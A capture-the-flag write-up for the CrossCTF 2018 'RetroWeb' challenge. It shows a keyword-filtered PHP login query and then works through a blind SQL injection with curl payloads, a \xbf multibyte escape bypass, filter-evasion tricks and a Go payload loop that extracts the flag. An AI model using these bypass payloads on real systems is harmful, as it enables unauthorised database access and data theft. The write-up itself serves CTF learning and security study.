
# CrossCTF Finals 2018: RetroWeb (web)

> Not so easy SQL injection at all.
> 
> http://ctf.pwn.sg:8180
>
> Creator - quanyang (@quanyang)

## Challenge

It says it on the tin. Not so easy SQL injection. Dig straight in to the code:

```
if (preg_match('/\s/', $username) or 
	preg_match('/[\/\\\\]/', $username) or 
	preg_match('/(and|or|null|not|union|select|from|where|group|order|having|limit|into|file|case|like)/i', $username) or 
	preg_match('/(--|\/\*|=|>|<)/', $username)) 
	exit('die hax0r!');
$username = mysql_escape_string($username);
$sql = "SELECT username FROM users WHERE username like '$username';";
$result = $conn->query($sql);
```

So this thing does SQL keyword filtering and `mysql_escape_string`. Seems impossible? It's not, ask Google. Some clicks brought me to [this site's example 9](https://pentesterlab.com/exercises/web_for_pentester_II/course) with a description of how to bypass mysql_escape_string. A nice hint in that example also tells you the use of this exploit: for playing CTFs! 

So let's first try bypassing `mysql_escape_string`: 

```
curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username="$(echo -e "SELECT")"
> die hax0r!
curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username="$(echo -e "\xbf'NOPE")"
> Nothing returned. (this means an SQL error occurred)
curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username="$(echo -e "\xbf'#")"
> Does not exist.
```

Yes! So the quote escaping is valid! We can now add additional statements behind our quote. Next step is to bypass SQL keyword filtering. 

A site that provided us with background on [bypassing SQL statement filtering](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/) gave us a lot of information and basics on how to write an SQL statement that bypasses the filter. Combined with the MySQL documentation, and lots of trial and error, we found out the following: 

1. You can wrap things in brackets to not need to use spaces. `OR(1)=(1)`
2. Use `&&` and `||` instead of `AND` and `OR`
3. Instead of using `UNION`, do a comparison and use the returned result to check
4. Instead of using `=`, you can use `IN`
5. Instead of strings, you can use hex characters
6. You can compare the substring of the flag by using `substr`

The guide on bypassing tells us that with all the keywords the filter blocked, we have to resort to blind SQL injection. It's where you compare a column character by character to determine if that character is contained in the column. In this case, we want to brute force every character of the flag out, given 1 bit (Exists or Does not exist) of information. 

Firstly, we need a way to check for the first character. Let's start with a simple statement. 

```
admin' OR 'C' in substr(flag,1,1)
```

Let's remove the `AND` and spaces:

```
admin'||('C')in(substr(flag,1,1))
```

We also need to remove the quotes and ignore everything else:

```
admin'||(0x43)in(substr(flag,1,1))#
```

Test it out:

```
curl -v -X POST http://ctf.pwn.sg:8180/\?search -d username="$(echo -e "admin\xbf'||((0x43)in(substr(flag,1,1)))#")"
```

Yay, we get `Exists`! The flag starts with 'C'

To extract the next character, you'd simply increase the length of the substring and the length of the hex string you're testing against, like so:

```
payload := fmt.Sprintf("username=%%BF'||(0x%x)IN(substr(flag,1,%d))#", str, len(str))
```

So, we looped through all possible characters one by one until we got the first, then the next, then the next. The flag `CROSSCTF{WHY` was slowly forming but then we realised that it was in all caps! The `IN` comparison is case-insensetive! 

Simple fix, that took us a while:

```
payload := fmt.Sprintf("username=%%BF'||(hex(0x%x))IN(hex(substr(flag,1,%d)))#", str, len(str))
```

[Complete code here](sql.go)

**It looks beautiful!**

<script src="https://asciinema.org/a/xsraeQYCb9Xya1WXB34uQYTCg.js" id="asciicast-xsraeQYCb9Xya1WXB34uQYTCg" async></script>
